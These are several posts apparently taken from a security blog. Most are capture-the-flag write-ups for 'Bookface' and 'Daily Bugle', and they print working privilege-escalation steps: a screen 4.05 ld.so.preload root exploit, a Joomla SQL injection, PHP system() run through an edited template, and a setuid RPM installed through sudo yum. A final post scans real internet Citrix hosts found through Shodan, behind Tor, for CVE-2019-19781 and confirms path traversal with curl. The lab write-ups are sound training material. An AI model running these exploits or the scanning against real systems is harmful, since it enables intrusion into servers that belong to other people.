0 0 33 Feb 23 2019 flag1 -rw-rw-r-- 1 1001 1001 141 Feb 23 2019 note 226 Directory send OK. ftp\u0026gt; get flag1 227 Entering Passive Mode (10,10,219,90,89,226). 150 Opening BINARY mode data connection for flag1 (33 bytes). 226 Transfer complete. 33 bytes received in 0.000288 seconds (112 kbytes/s) ftp\u0026gt; get note 227 Entering Passive Mode (10,10,219,90,89,216). 150 Opening BINARY mode data connection for note (141 bytes). 226 Transfer complete. 141 bytes received in 0.000263 seconds (524 kbytes/s) Two files, first with flag, the second with some interesting notes.\n$ cat flag1 79eb173ecb02d12d6d4832881be2cf23 FLAG1: 79eb173ecb02d12d6d4832881be2cf23 $ cat note Jerry, I finally got a chance to update our internal social media platform (bookface.com). Can you signup and like my doggo photos? Thanks Ouu, there is also some domain, lets look on it, if we can find there something interesting. After couple of requests to different types of DNS records, I found the the right one. In TXT record there are flag and also some ports, but wait. Why was there so many ports open?\nhost -t txt bookface.com 10.10.219.90 Using domain server: Name: 10.10.219.90 Address: 10.10.219.90#53 Aliases: bookface.com descriptive text \u0026#34;Ports: 6786 9893 8748 3443 - Who cares about order tho right?\u0026#34; bookface.com descriptive text \u0026#34;Flag2:a17f17ba86d8271da60ed8436667f412\u0026#34; FLAG2: a17f17ba86d8271da60ed8436667f412 It looks like port knocking now. But according to comment we don\u0026rsquo;t know order of ports, so I wrote port-knocking-enumeration to brute force the order.\nsource: port-knocking-enumeration.sh\n#!/bin/bash porta=(8748 3443 6786 9893) portb=(6786 9893 8748 3443) portc=(9893 8748 3443 6786) portd=(3443 6786 9893 8748) ip=\u0026#34;10.10.213.66\u0026#34; for a in ${porta[@]}; do for b in ${portb[@]}; do for c in ${portc[@]}; do for d in ${portd[@]}; do echo \u0026#34;$a $b $c $d\u0026#34; knock $ip $a $b $c $d \u0026amp;\u0026amp; nmap -p 22 $ip 2\u0026gt;\u0026amp;1 | grep \u0026#34;open\u0026#34; \u0026amp;\u0026amp; echo \u0026#34;[SUCCESS!!] $a $b $c $d\u0026#34; \u0026amp;\u0026amp; exit sleep 1 done done done done Let\u0026rsquo;s brute force it!\n$ ./port-knocking-enumeration.sh 8748 6786 9893 3443 8748 6786 9893 6786 8748 6786 9893 9893 8748 6786 9893 8748 8748 6786 8748 3443 8748 6786 8748 6786 8748 6786 8748 9893 8748 6786 8748 8748 8748 6786 3443 3443 8748 6786 3443 6786 8748 6786 3443 9893 8748 6786 3443 8748 8748 6786 6786 3443 8748 6786 6786 6786 8748 6786 6786 9893 8748 6786 6786 8748 8748 9893 9893 3443 8748 9893 9893 6786 8748 9893 9893 9893 8748 9893 9893 8748 8748 9893 8748 3443 8748 9893 8748 6786 8748 9893 8748 9893 8748 9893 8748 8748 8748 9893 3443 3443 8748 9893 3443 6786 8748 9893 3443 9893 8748 9893 3443 8748 8748 9893 6786 3443 22/tcp open ssh [SUCCESS!!] 8748 9893 6786 3443 Now we have the right order! We can verify it..\n$ knock 10.10.213.66 8748 9893 6786 3443 \u0026amp;\u0026amp; nmap -sV -p22 10.10.213.66 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 19:55 CET Nmap scan report for 10.10.213.66 Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds aand connect to ssh. Password is same as on FTP of course ;)\n$ knock 10.10.213.66 8748 9893 6786 3443 \u0026amp;\u0026amp; ssh jerry@10.10.213.66 jerry@10.10.213.66\u0026#39;s password: Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Get cloud support with Ubuntu Advantage Cloud Guest: http://www.ubuntu.com/business/services/cloud 73 packages can be updated. 48 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Feb 23 22:17:39 2019 from 10.0.0.20 jerry@ip-10-10-213-66:~$ We\u0026rsquo;re in, so let\u0026rsquo;s find another flag.\njerry@ip-10-10-213-66:/home$ find / -name \u0026#34;flag3\u0026#34; 2\u0026gt;/dev/null /home/flag3 jerry@ip-10-10-213-66:/home$ cat /home/flag3 dd059316033c59f00057e5552140f831 FLAG3: dd059316033c59f00057e5552140f831 Okey, that was pretty easy, but for the last one flag we will need the root priviledges. So how to find vulnerability to gain the root priviledges? Let\u0026rsquo;s search some binaries with setuid bit flag.\njerry@ip-10-10-140-162:/etc$ find / -perm -u=s -type f 2\u0026gt;/dev/null /snap/core/5742/bin/mount /snap/core/5742/bin/ping /snap/core/5742/bin/ping6 /snap/core/5742/bin/su /snap/core/5742/bin/umount /snap/core/5742/usr/bin/chfn /snap/core/5742/usr/bin/chsh /snap/core/5742/usr/bin/gpasswd /snap/core/5742/usr/bin/newgrp ... /bin/umount /bin/fusermount /bin/ntfs-3g /bin/ping /bin/su /bin/ping6 /bin/screen-4.5.0/screen-4.05.0 /bin/mount only screen has a version in a name of file and that\u0026rsquo;s interesting. We can look at the internet and find the exploit if exists. The best way how to find the correct exploit and not malware :) is on exploit-db website from offensive-security.\nI found one that could works. exploit\n$ cat \u0026lt;\u0026lt; EOF \u0026gt; /tmp/libhax.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; __attribute__ ((__constructor__)) void dropshell(void){ chown(\u0026#34;/tmp/rootshell\u0026#34;, 0, 0); chmod(\u0026#34;/tmp/rootshell\u0026#34;, 04755); unlink(\u0026#34;/etc/ld.so.preload\u0026#34;); printf(\u0026#34;[+] done!\\n\u0026#34;); } EOF $ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c $ ls /tmp/ $ cat \u0026lt;\u0026lt; EOF \u0026gt; /tmp/rootshell.c #include \u0026lt;stdio.h\u0026gt; int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); } EOF $ gcc -o /tmp/rootshell /tmp/rootshell.c $ cd /etc/ $ umask 000 $ screen -D -m -L ld.so.preload echo -ne \u0026#34;\\x0a/tmp/libhax.so\u0026#34; $ /bin/screen-4.5.0/screen-4.05.0 -D -m -L ld.so.preload echo -ne \u0026#34;\\x0a/tmp/libhax.so\u0026#34; $ /tmp/rootshell And now we have root priviledges, so let\u0026rsquo;s take the last one flag.\n# cat /root/flag4 6b873b86b1f3eb170554af54fddb8267 FLAG4: 6b873b86b1f3eb170554af54fddb8267 I hope you enjoy the game and learn something new. Bye;)\n","permalink":"https://www.burso.eu/posts/bookface/","summary":"Before we start, read more about following tools \u0026amp; vulnerabilities. It will contains in this CTF\nhydra screen - CVE-2017-5618 knock and also you can read more about additional security method called port knocking\nSo let\u0026rsquo;s start as usual with nmap.\nnmap -F --top-ports 10 -sV 10.10.219.90 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 16:37 CET Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.","title":"Bookface"},{"content":"Hi guys, today we look at CTF called Daily Bugle and we try to gain root priviledges. :) Let\u0026rsquo;s play.\nNOTICE: (SPOILER!!) If you would like to solve it by yourself, don\u0026rsquo;t read this post!\n[Task 1] First question is pretty simple. Open the article and you can find the answer\nAccess the web server, who robbed the bank?\nspiderman [Task 2] $ curl http://10.10.86.172/media/system/js/mootools-more.js 2\u0026gt;/dev/null | grep MooTools.More MooTools.More={version:\u0026#34;1.4.0.1\u0026#34;,build:\u0026#34;a4244edf2aa97ac8a196fc96082dd35af1abab87\u0026#34;};(function(){Events.Pseudos=function(h,e,f){var d=\u0026#34;_monitorEvents:\u0026#34;;var c=function(i){return{store:i.store?function(j,k){i.store(d+j,k); $ curl http://10.10.86.172/language/en-GB/en-GB.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;metafile version=\u0026#34;3.7\u0026#34; client=\u0026#34;site\u0026#34;\u0026gt; \u0026lt;name\u0026gt;English (en-GB)\u0026lt;/name\u0026gt; \u0026lt;version\u0026gt;3.7.0\u0026lt;/version\u0026gt; \u0026lt;creationDate\u0026gt;April 2017\u0026lt;/creationDate\u0026gt; \u0026lt;author\u0026gt;Joomla! Project\u0026lt;/author\u0026gt; \u0026lt;authorEmail\u0026gt;admin@joomla.org\u0026lt;/authorEmail\u0026gt; \u0026lt;authorUrl\u0026gt;www.joomla.org\u0026lt;/authorUrl\u0026gt; \u0026lt;copyright\u0026gt;Copyright (C) 2005 - 2017 Open Source Matters. All rights reserved.\u0026lt;/copyright\u0026gt; \u0026lt;license\u0026gt;GNU General Public License version 2 or later; see LICENSE.txt\u0026lt;/license\u0026gt; \u0026lt;description\u0026gt;\u0026lt;![CDATA[en-GB site language]]\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;metadata\u0026gt; \u0026lt;name\u0026gt;English (en-GB)\u0026lt;/name\u0026gt; \u0026lt;nativeName\u0026gt;English (United Kingdom)\u0026lt;/nativeName\u0026gt; \u0026lt;tag\u0026gt;en-GB\u0026lt;/tag\u0026gt; \u0026lt;rtl\u0026gt;0\u0026lt;/rtl\u0026gt; \u0026lt;locale\u0026gt;en_GB.utf8, en_GB.UTF-8, en_GB, eng_GB, en, english, english-uk, uk, gbr, britain, england, great britain, uk, united kingdom, united-kingdom\u0026lt;/locale\u0026gt; \u0026lt;firstDay\u0026gt;0\u0026lt;/firstDay\u0026gt; \u0026lt;weekEnd\u0026gt;0,6\u0026lt;/weekEnd\u0026gt; \u0026lt;calendar\u0026gt;gregorian\u0026lt;/calendar\u0026gt; \u0026lt;/metadata\u0026gt; \u0026lt;params /\u0026gt; \u0026lt;/metafile\u0026gt; We found it.\nWhat is the Joomla version?\n3.7.0 After some research of finding following exploits for SQL Injection in Joomla\nsqlmap metasploit I found the best way to solve this task and exploit the Joomla 3.7.0 SQLi vulnerability\npython exploit $ git clone git@github.com:XiphosResearch/exploits.git $ cd exploits/Joomblah and finally run the exploit.\n$ python2 joomblah.py http://10.10.86.172 .---. .-\u0026#39;\u0026#39;\u0026#39;-. .-\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39; _ \\ \u0026#39; _ \\ .---. \u0026#39;---\u0026#39; / /` \u0026#39;. \\ / /` \u0026#39;. \\ __ __ ___ /| | | . .---.. | \\ \u0026#39; . | \\ \u0026#39; | |/ `.\u0026#39; `. || | | .\u0026#39;| | || \u0026#39; | \u0026#39;| \u0026#39; | \u0026#39;| .-. .-. \u0026#39;|| | | \u0026lt; | | |\\ \\ / / \\ \\ / / | | | | | ||| __ | | __ | | | | `. ` ..\u0026#39; / `. ` ..\u0026#39; / | | | | | |||/\u0026#39;__ \u0026#39;. | | .:--.\u0026#39;. | | .\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39;-...-\u0026#39;` \u0026#39;-...-\u0026#39;` | | | | | ||:/` \u0026#39;. \u0026#39;| |/ | \\ | | |/.\u0026#39;\u0026#39;\u0026#39;. \\ | | | | | | | ||| | || |`\u0026#34; __ | | | / | | | | |__| |__| |__|||\\ / \u0026#39;| | .\u0026#39;.\u0026#39;\u0026#39;| | | | | | __.\u0026#39; \u0026#39; |/\u0026#39;..\u0026#39; / \u0026#39;---\u0026#39;/ / | |_| | | | | \u0026#39; \u0026#39; `\u0026#39;-\u0026#39;` \\ \\._,\\ \u0026#39;/| \u0026#39;. | \u0026#39;. |____.\u0026#39; `--\u0026#39; `\u0026#34; \u0026#39;---\u0026#39; \u0026#39;---\u0026#39; [-] Fetching CSRF token [-] Testing SQLi - Found table: fb9j5_users - Extracting users from fb9j5_users [$] Found user [\u0026#39;811\u0026#39;, \u0026#39;Super User\u0026#39;, \u0026#39;jonah\u0026#39;, \u0026#39;jonah@tryhackme.com\u0026#39;, \u0026#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;] - Extracting sessions from fb9j5_session Now we need to crack the hashed password, so we save bcrypt hash to file hashes.txt and run.\nc:\\john-1.9.0-jumbo-1-win64\\run\u0026gt;john.exe --wordlist=C:\\Users\\burso\\Downloads\\rockyou.txt --rules=wordlist --min-len=12 --max-len=12 ../hashes.txt Warning: detected hash type \u0026#34;bcrypt\u0026#34;, but the string is also recognized as \u0026#34;bcrypt-opencl\u0026#34; Use the \u0026#34;--format=bcrypt-opencl\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status spiderman123 (?) 1g 0:00:00:02 DONE (2020-02-07 10:54) 0.3846g/s 110.7p/s 110.7c/s 110.7C/s ilovepatrick..quetzalcoatl Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed What is Jonah\u0026rsquo;s cracked password?\nspiderman123 After logged in to the /administrator page with login jonah and password spiderman123 we need to gain access to ssh. go to page /administrator/index.php?option=com_templates\u0026amp;view=template\u0026amp;id=506\u0026amp;file=L2luZGV4LnBocA. We can edit index.php of template so we can run any command on server and execute them via Template Preview. Before run you don\u0026rsquo;t forget to save file.\nsystem(\u0026#34;id\u0026#34;); uid=48(apache) gid=48(apache) groups=48(apache) Now we now any command executed via Joomla Template will run under apache user.\nsystem(\u0026#34;cat /etc/passwd\u0026#34;); root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin We can see user jonah has jjameson username in ssh login, so we need password now.\nsystem(\u0026#34;cat configuration.php\u0026#34;); Please check back again soon.\u0026#39;; public $display_offline_message = \u0026#39;1\u0026#39;; public $offline_image = \u0026#39;\u0026#39;; public $sitename = \u0026#39;The Daily Bugle\u0026#39;; public $editor = \u0026#39;tinymce\u0026#39;; public $captcha = \u0026#39;0\u0026#39;; public $list_limit = \u0026#39;20\u0026#39;; public $access = \u0026#39;1\u0026#39;; public $debug = \u0026#39;0\u0026#39;; public $debug_lang = \u0026#39;0\u0026#39;; public $dbtype = \u0026#39;mysqli\u0026#39;; public $host = \u0026#39;localhost\u0026#39;; public $user = \u0026#39;root\u0026#39;; public $password = \u0026#39;nv5uz9r3ZEDzVjNu\u0026#39;; public $db = \u0026#39;joomla\u0026#39;; public $dbprefix = \u0026#39;fb9j5_\u0026#39;; public $live_site = \u0026#39;\u0026#39;; public $secret = \u0026#39;UAMBRWzHO3oFPmVC\u0026#39;; public $gzip = \u0026#39;0\u0026#39;; public $error_reporting = \u0026#39;default\u0026#39;; public $helpurl = \u0026#39;https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}\u0026#39;; public $ftp_host = \u0026#39;127.0.0.1\u0026#39;; public $ftp_port = \u0026#39;21\u0026#39;; public $ftp_user = \u0026#39;\u0026#39;; public $ftp_pass = \u0026#39;\u0026#39;; public $ftp_root = \u0026#39;\u0026#39;; public $ftp_enable = \u0026#39;0\u0026#39;; public $offset = \u0026#39;UTC\u0026#39;; public $mailonline = \u0026#39;1\u0026#39;; public $mailer = \u0026#39;mail\u0026#39;; public $mailfrom = \u0026#39;jonah@tryhackme.com\u0026#39;; public $fromname = \u0026#39;The Daily Bugle\u0026#39;; public $sendmail = \u0026#39;/usr/sbin/sendmail\u0026#39;; public $smtpauth = \u0026#39;0\u0026#39;; public $smtpuser = \u0026#39;\u0026#39;; public $smtppass = \u0026#39;\u0026#39;; public $smtphost = \u0026#39;localhost\u0026#39;; public $smtpsecure = \u0026#39;none\u0026#39;; public $smtpport = \u0026#39;25\u0026#39;; public $caching = \u0026#39;0\u0026#39;; public $cache_handler = \u0026#39;file\u0026#39;; public $cachetime = \u0026#39;15\u0026#39;; public $cache_platformprefix = \u0026#39;0\u0026#39;; public $MetaDesc = \u0026#39;New York City tabloid newspaper\u0026#39;; public $MetaKeys = \u0026#39;\u0026#39;; public $MetaTitle = \u0026#39;1\u0026#39;; public $MetaAuthor = \u0026#39;1\u0026#39;; public $MetaVersion = \u0026#39;0\u0026#39;; public $robots = \u0026#39;\u0026#39;; public $sef = \u0026#39;1\u0026#39;; public $sef_rewrite = \u0026#39;0\u0026#39;; public $sef_suffix = \u0026#39;0\u0026#39;; public $unicodeslugs = \u0026#39;0\u0026#39;; public $feed_limit = \u0026#39;10\u0026#39;; public $feed_email = \u0026#39;none\u0026#39;; public $log_path = \u0026#39;/var/www/html/administrator/logs\u0026#39;; public $tmp_path = \u0026#39;/var/www/html/tmp\u0026#39;; public $lifetime = \u0026#39;15\u0026#39;; public $session_handler = \u0026#39;database\u0026#39;; public $shared_session = \u0026#39;0\u0026#39;; } Interesting. We can try the password to database if it is not the same to jjameson ssh login.\nusername: jjamesson password: nv5uz9r3ZEDzVjNu $ ssh jjameson@10.10.86.172 jjameson@10.10.162.2\u0026#39;s password: Last failed login: Fri Feb 7 10:07:52 EST 2020 from ip-10-8-11-158.eu-west-1.compute.internal on ssh:notty There were 724 failed login attempts since the last successful login. Last login: Mon Dec 16 05:14:55 2019 from netwars Yes, everything works!\n[jjameson@dailybugle ~]$ ls user.txt [jjameson@dailybugle ~]$ cat user.txt 27a260fe3cba712cfdedb1c86d80442e What is the user flag?\n27a260fe3cba712cfdedb1c86d80442e The last step is gain root access on this machine. So let\u0026rsquo;s do it!\n[jjameson@dailybugle ~]$ sudo -l Matching Defaults entries for jjameson on dailybugle: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User jjameson may run the following commands on dailybugle: (ALL) NOPASSWD: /usr/bin/yum Yum is the only one command you can run under root and that\u0026rsquo;s security missconfiguration. More about the vulnerability you can find here. You can download the exploit here\nSo let\u0026rsquo;s download the exploit and copy to vulnerable server\n$ wget https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm $ scp setuid-pop.rpm jjameson@10.10.86.172:~ Now extract the exploit and install it via yum\n[jjameson@dailybugle ~]$ cat setuid-pop.rpm | base64 -d | gzip -d \u0026gt; yumsploit.rpm [jjameson@dailybugle ~]$ sudo yum localinstall ~/yumsploit.rpm Loaded plugins: fastestmirror Examining /home/jjameson/yumsploit.rpm: sploit-1.0-1.x86_64 Marking /home/jjameson/yumsploit.rpm to be installed Resolving Dependencies --\u0026gt; Running transaction check ---\u0026gt; Package sploit.x86_64 0:1.0-1 will be installed --\u0026gt; Finished Dependency Resolution Dependencies Resolved ... Downloading packages: Running transaction check Running transaction test Transaction test succeeded Running transaction Installing : sploit-1.0-1.x86_64 1/1 Verifying : sploit-1.0-1.x86_64 1/1 Installed: sploit.x86_64 0:1.0-1 Complete! We have installed pop binary in /usr/local/bin directory with setuid bit. That means pop binary will be runned with root priviledges.\nmeson@dailybugle ~]$ ls -la /usr/local/bin total 12 drwxr-xr-x. 2 root root 17 Feb 7 10:43 . drwxr-xr-x. 12 root root 131 Dec 14 13:57 .. -rwsr-sr-x 1 root root 8744 Jan 18 2019 pop Let\u0026rsquo;s execute it.\n[jjameson@dailybugle ~]$ pop [root@dailybugle ~]# id uid=0(root) gid=0(root) groups=0(root),1000(jjameson) [root@dailybugle ~]# cat /root/root.txt eec3d53292b1821868266858d7fa6f79 Done! We have now root priviledges.\nWhat is the root flag?\neec3d53292b1821868266858d7fa6f79 ","permalink":"https://www.burso.eu/posts/daily-bugle/","summary":"Hi guys, today we look at CTF called Daily Bugle and we try to gain root priviledges. :) Let\u0026rsquo;s play.\nNOTICE: (SPOILER!!) If you would like to solve it by yourself, don\u0026rsquo;t read this post!\n[Task 1] First question is pretty simple. Open the article and you can find the answer\nAccess the web server, who robbed the bank?\nspiderman [Task 2] $ curl http://10.10.86.172/media/system/js/mootools-more.js 2\u0026gt;/dev/null | grep MooTools.More MooTools.More={version:\u0026#34;1.4.0.1\u0026#34;,build:\u0026#34;a4244edf2aa97ac8a196fc96082dd35af1abab87\u0026#34;};(function(){Events.Pseudos=function(h,e,f){var d=\u0026#34;_monitorEvents:\u0026#34;;var c=function(i){return{store:i.","title":"Daily Bugle"},{"content":"Welcome here in new year, I would like to introduce one of easy CTF in reverse engineering category\nradare2 [gdb] $ r2 ./impossible_password.bin [0x004006a0]\u0026gt; aaa ... [0x004006a0]\u0026gt; afl 0x004006a0 1 41 entry0 0x00400610 1 6 sym.imp.__libc_start_main 0x004005f0 1 6 sym.imp.putchar 0x00400600 1 6 sym.imp.printf 0x00400620 1 6 sym.imp.srand 0x00400630 1 6 sym.imp.strcmp 0x00400650 1 6 sym.imp.time 0x00400660 1 6 sym.imp.malloc 0x00400670 1 6 sym.imp.__isoc99_scanf 0x00400680 1 6 sym.imp.exit 0x00400690 1 6 sym.imp.rand 0x0040085d 5 283 main 0x0040078d 7 208 fcn.0040078d 0x00400978 5 96 fcn.00400978 0x00400760 8 141 -\u0026gt; 99 entry.init0 0x00400740 3 28 entry.fini0 0x004006d0 4 41 fcn.004006d0 0x00400640 1 6 loc.imp.__gmon_start__ 0x004005c0 3 26 fcn.004005c0 We can see, that there is some import functions for randomization: sym.imp.srand, sym.imp.rand. Okay, let\u0026rsquo;s look at the beggining.\n[0x004006a0]\u0026gt; pdf @ main ... 0x0040085d 55 pushq %rbp │ 0x0040085e 4889e5 %rsp = %rbp │ 0x00400861 4883ec50 subq $0x50,%rsp │ 0x00400865 897dbc movl %edi,-0x44(%rbp) ; argc │ 0x00400868 488975b0 %rsi = var_50h ; argv │ 0x0040086c 48c745f8700a. $str.SuperSeKretKey = s2 ; 0x400a70 ; \u0026#34;SuperSeKretKey\u0026#34; ... 0x004008ce e82dfdffff callq sym.imp.printf ; int printf(const char *format) │ 0x004008d3 488d45e0 leaq s1,%rax │ 0x004008d7 4889c6 %rax = %rsi │ 0x004008da bf820a4000 movl $str._20s,%edi ; 0x400a82 ; \u0026#34;%20s\u0026#34; ; const char *format │ 0x004008df b800000000 movl $0,%eax │ 0x004008e4 e887fdffff callq sym.imp.__isoc99_scanf ; int scanf(const char *format) │ 0x004008e9 488d45e0 leaq s1,%rax │ 0x004008ed 4889c6 %rax = %rsi │ 0x004008f0 bf870a4000 movl $str.__s__n,%edi ; 0x400a87 ; \u0026#34;[%s]\\n\u0026#34; ; const char *format │ 0x004008f5 b800000000 movl $0,%eax │ 0x004008fa e801fdffff callq sym.imp.printf ; int printf(const char *format) │ 0x004008ff 488b55f8 -8(%rbp) = %rdx │ 0x00400903 488d45e0 leaq s1,%rax │ 0x00400907 4889d6 %rdx = %rsi ; const char *s2 │ 0x0040090a 4889c7 %rax = %rdi ; const char *s1 │ 0x0040090d e81efdffff callq sym.imp.strcmp ; int strcmp(const char *s1, const char *s2) ... So first key we need is SuperSeKretKey\n","permalink":"https://www.burso.eu/posts/impossible-password/","summary":"Welcome here in new year, I would like to introduce one of easy CTF in reverse engineering category\nradare2 [gdb] $ r2 ./impossible_password.bin [0x004006a0]\u0026gt; aaa ... [0x004006a0]\u0026gt; afl 0x004006a0 1 41 entry0 0x00400610 1 6 sym.imp.__libc_start_main 0x004005f0 1 6 sym.imp.putchar 0x00400600 1 6 sym.imp.printf 0x00400620 1 6 sym.imp.srand 0x00400630 1 6 sym.imp.strcmp 0x00400650 1 6 sym.imp.time 0x00400660 1 6 sym.imp.malloc 0x00400670 1 6 sym.imp.__isoc99_scanf 0x00400680 1 6 sym.imp.exit 0x00400690 1 6 sym.","title":"Impossible Password"},{"content":"NOTICE: Educational purposes only!\nHi, I want to show you how easy it is to find a vulnerable server on the internet. Okey guys, so now, firstly we need to have some TOR client for anonymity ;) Before we begin, look at the following tools\ntor nyx proxychains-ng shodan curl nmap $ tor \u0026amp; $ nyx -i 127.0.0.1:9052 Then we can test, if the tor is working correctly with proxychains\n$ proxychains curl ifconfig.me [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/lib/libproxychains4.so [proxychains] DLL init: proxychains-ng 4.14 [proxychains] Strict chain ... 127.0.0.1:9050 ... ifconfig.me:80 ... OK 46.166.139.111 Run shodan to get all open services which look like Citrix ADC Gateway\n$ proxychains -q shodan search --fields=\u0026#34;ip_str,port\u0026#34; citrix netscaler \u0026gt; $HOME/citrix_list Now we will prepare a script that scans the vulnerability CVE-2019-19781 in these services\n#!/bin/bash CITRIX_IP_LIST=\u0026#34;$HOME/citrix_list\u0026#34; while read CITRIX_IP_PORT; do IP=$(echo $CITRIX_IP_PORT | awk \u0026#39;{print $1}\u0026#39;) PORT=$(echo $CITRIX_IP_PORT | awk \u0026#39;{print $2}\u0026#39;) proxychains -q nmap -p $PORT -sV --script CVE-2019-19781 $IP done \u0026lt; $CITRIX_IP_LIST After a short moment we get some interesting results. There are still servers with this vulnerability present.\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 15:16 CET Nmap scan report for ---.---.---.--- Host is up (0.75s latency). PORT STATE SERVICE VERSION ----/tcp open ssl/unknown | CVE-2019-19781: | VULNERABLE: | Remote Code Execution vulnerability in Citrix Application Delivery Controller (ADC) | State: VULNERABLE | IDs: CVE:CVE-2019-19781 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Citrix Application Delivery Controller (ADC) CVE-2019-19781. | | Disclosure date: 2019-12-17 | References: | https://support.citrix.com/article/CTX267027 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19781 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 152.99 seconds Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 15:18 CET Nmap scan report for ---.---.---.--- Host is up (0.47s latency). PORT STATE SERVICE VERSION ----/tcp open ssl/unknown | CVE-2019-19781: | VULNERABLE: | Remote Code Execution vulnerability in Citrix Application Delivery Controller (ADC) | State: VULNERABLE | IDs: CVE:CVE-2019-19781 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Citrix Application Delivery Controller (ADC) CVE-2019-19781. | | Disclosure date: 2019-12-17 | References: | https://support.citrix.com/article/CTX267027 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19781 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 142.11 seconds Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 15:21 CET Nmap scan report for ---.---.---.--- Host is up (0.53s latency). PORT STATE SERVICE VERSION ----/tcp open ssl/unknown | CVE-2019-19781: | VULNERABLE: | Remote Code Execution vulnerability in Citrix Application Delivery Controller (ADC) | State: VULNERABLE | IDs: CVE:CVE-2019-19781 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Citrix Application Delivery Controller (ADC) CVE-2019-19781. | | Disclosure date: 2019-12-17 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19781 |_ https://support.citrix.com/article/CTX267027 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 155.56 seconds We can verify the vulnerability by using curl.\n$ proxychains -q curl -k --path-as-is https://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/vpn/../vpns/cfg/smb.conf \u0026amp;\u0026amp; echo -e [global] encrypt passwords = yes name resolve order = lmhosts wins host bcast And that’s it. :) We will not continue from this point, but there exists a RCE exploit that enables the user to gain full 